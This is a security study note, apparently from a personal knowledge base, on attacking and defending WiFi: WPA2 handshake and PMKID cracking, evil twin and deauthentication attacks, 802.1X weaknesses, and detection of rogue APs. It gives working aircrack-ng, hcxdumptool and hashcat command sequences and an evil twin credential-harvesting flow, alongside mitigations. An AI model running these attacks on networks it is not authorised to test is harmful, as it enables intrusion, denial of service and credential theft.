# Wireless Security — Attacking and Defending WiFi
> Wireless is just networking where the cable is invisible — and the attacker doesn't need physical access to your building.

---

## WiFi Security Protocol Timeline

| Protocol | Year | Status | Vulnerability |
|---|---|---|---|
| **WEP** | 1997 | Broken — never use | RC4 key reuse, crackable in minutes |
| **WPA** | 2003 | Broken | TKIP vulnerabilities, short key space |
| **WPA2** (CCMP/AES) | 2004 | Current standard, still viable with strong password | 4-way handshake capture → offline crack |
| **WPA3** | 2018 | Best available | Simultaneous Authentication of Equals (SAE) — resistant to offline cracking |

**WEP is dead.** Any modern router that offers WEP is too old to trust. WPA3 should be your target for any newly configured AP.

---

## WPA2 Attacks

### 4-Way Handshake Capture
**The classic attack.** When a client connects to a WPA2 AP, a 4-message handshake occurs. This handshake, combined with the SSID and the pre-shared key (password), produces the Pairwise Master Key (PMK). Capture the handshake → crack the PMK offline.

```bash
# Start monitor mode
sudo airmon-ng start wlan0

# Scan for targets
sudo airodump-ng wlan0mon

# Capture on target channel, filter by BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Force a client to reconnect (send deauth) to capture handshake faster
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Crack the captured handshake
aircrack-ng capture*.cap -w /usr/share/wordlists/rockyou.txt

# Or with hashcat (faster, GPU):
hcxdumptool -i wlan0mon -o capture.pcapng    # Better capture tool
hcxpcapngtool capture.pcapng -o hash.hc22000 # Convert to hashcat format
hashcat -m 22000 hash.hc22000 rockyou.txt    # Crack
```

**Why this matters defensively:** A long, random password (20+ chars, not a dictionary word) makes offline cracking computationally infeasible even with GPU cracking farms.

### PMKID Attack
Newer technique (2018, Jens Steube/hashcat). Does not require waiting for a client to connect.
- PMKID is derivable from the AP's beacon frames alone
- Can be captured from the AP without waiting for a client handshake
- Same offline dictionary attack once captured

```bash
# Capture PMKID without waiting for handshake
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool pmkid.pcapng -o hash.hc22000
hashcat -m 22000 hash.hc22000 wordlist.txt
```

**Implication:** There's no "safe" time to use WPA2. The attack surface is the AP itself, not waiting for clients.

---

## Evil Twin Attack

### What It Is
Deploy a rogue AP with the same SSID (and optionally same BSSID) as a legitimate network. Force clients to connect to the rogue AP instead. Perform MITM.

### Attack Flow
1. Scan for target SSID with airodump-ng
2. Create rogue AP on same channel with same SSID (hostapd)
3. Optionally: continuously deauth clients from legitimate AP to force them to the stronger-signal evil twin
4. Clients connect → traffic flows through attacker
5. SSL stripping or fake captive portal to harvest credentials

### Tools
- **hostapd-wpe:** Evil twin framework with WPA2-Enterprise credential capture
- **[[CAIM]] (WiFi Pineapple MK7):** Hardware purpose-built for this — PineAP handles beacon flooding, SSID capture, client association
- **airbase-ng:** Basic evil twin creation
- **Bettercap:** MITM framework, works with evil twin for credential capture

### CAIM in [YOUR-LAB]
[[CAIM]] (WiFi Pineapple MK7) is used for authorized wireless testing in the [YOUR-LAB] lab:
- PineAP: broadcast hundreds of SSIDs to attract probing devices
- Deauth: force clients off legitimate APs
- Evil twin: capture captive portal creds
- Passive recon: log all SSIDs and client probes in range

See `notes/knowledge/tools/` and CAIM wikilink for hardware details.

---

## Deauthentication Attacks

### 802.11 Management Frame Problem
WiFi management frames (probe, authentication, association, deauthentication, disassociation) are:
- **Unauthenticated** in WPA2 — anyone can send them
- **Spoofed** easily — set source MAC to anything
- **Acted upon** by clients and APs without verification

This means any attacker can send a deauth frame spoofed from the AP to a client, and the client *must* disconnect.

### Uses
- Force handshake capture (deauth + reconnect = capture 4-way handshake)
- DoS: constant deauth prevents connectivity
- Evil twin prep: deauth from legitimate AP forces client to evil twin

### WPA3 Fix
WPA3 implements **Management Frame Protection (MFP/802.11w)** — management frames are now cryptographically signed and can't be spoofed.

**Detection:** [[Kismet]] or [[Suricata]] wireless rules can detect deauth flood patterns.

---

## Enterprise Wireless: 802.1X

For corporate networks, WPA2-Personal (shared password) is inadequate. WPA2-Enterprise uses:
- **802.1X:** Port-based network access control
- **RADIUS server:** Authentication server that validates credentials
- **EAP (Extensible Authentication Protocol):** Authentication method

### EAP Types (Weakest to Strongest)
| EAP Type | Auth Method | Risk |
|---|---|---|
| PEAP-MSCHAPv2 | Username/password, server cert | Common target — evil twin can harvest creds if client doesn't verify server cert |
| EAP-TTLS | Username/password in encrypted tunnel | Better, same client cert verification issue |
| EAP-TLS | Mutual certificate auth | Strongest — both client and server present certs |

**PEAP Evil Twin:** If an enterprise WiFi client doesn't verify the RADIUS server certificate, it'll happily send credentials to an evil twin with any certificate. hostapd-wpe exploits this.

**Mitigation:** Enforce server certificate verification in 802.1X supplicant config. Pin to specific CA.

---

## Wireless Tools

| Tool | Purpose |
|---|---|
| **aircrack-ng suite** | Full WPA2 attack toolkit: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng |
| **hcxdumptool + hcxtools** | Better capture (PMKID, handshake), converts to hashcat format |
| **[[Hashcat]]** | GPU-accelerated offline cracking |
| **[[Wireshark]]** | Packet analysis, 802.11 frame inspection |
| **Kismet** | Passive wireless monitoring, WIDS capability, logs all SSIDs/clients/frames |
| **hostapd-wpe** | Evil twin + WPA-Enterprise credential capture |
| **Bettercap** | MITM framework, ARP/DNS/SSL attacks over WiFi |
| **[[CAIM]] (WiFi Pineapple MK7)** | All-in-one wireless attack platform for authorized testing |
| **[[Flipper Zero]]** | Sub-GHz, NFC, RFID — not WiFi, but same wireless pentesting category |

---

## Enterprise Wireless Detection (WIDS)

**Rogue AP Detection:**
- Compare list of observed BSSIDs against known/approved AP list
- APs with your SSID but unknown BSSID = evil twin attempt
- Physical location inconsistency (signal too strong from direction with no AP)

**Deauth Flood Detection:**
- Count deauth frames per BSSID per minute
- > 10 deauth frames/minute from same MAC = suspicious
- [[Kismet]] + [[Suricata]] wireless rules can do this

**Client Probing Exposure:**
- Devices broadcast SSIDs they previously connected to in probe requests
- Corporate laptops leaking home/coffee shop SSIDs = attack surface
- Kismet logs all probes — useful for mapping client exposure

---

## Tags
`#wireless` `#wpa2` `#evil-twin` `#802.11` `#wpa3` `#wifi-security`

[[CAIM]] [[Flipper Zero]] [[Wireshark]] [[Hashcat]] [[Network Security]] [[CySA+]] [[Suricata]]
